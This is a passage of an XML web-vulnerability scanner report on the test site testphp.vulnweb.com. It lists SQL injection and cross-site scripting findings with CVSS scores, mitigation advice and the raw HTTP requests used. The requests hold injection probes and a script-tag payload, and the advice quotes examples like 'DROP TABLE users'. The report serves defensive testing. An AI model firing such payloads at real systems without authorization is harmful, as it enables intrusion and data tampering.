<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /Mod_Rewrite_Shop/RateProduct-3%20AND%203*2*1%3d6%20AND%20992%3d992.html HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:20 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 93
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="22" color="red">
       <Name><![CDATA[SQL injection]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[Path Fragment (suffix /) input <b><font color="dark">-</font></b> was set to <b><font color="dark">1'&quot;</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/buy.php on line 8</font></pre>]]></Details>
       <Affects><![CDATA[/]]></Affects>
       <Parameter><![CDATA[-]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-1'%22/ HTTP/1.1
Referer: http://testphp.vulnweb.com/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:24 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 136
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="23" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">p</font></b> was set to <b><font color="dark">valid'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;E3b5(9132)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/hpp/params.php]]></Affects>
       <Parameter><![CDATA[p]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /hpp/params.php?p=valid'%22()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;E3b5(9132)&lt;/ScRiPt&gt;&amp;pp=12 HTTP/1.1
Referer: http://testphp.vulnweb.com/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:34 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 46
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
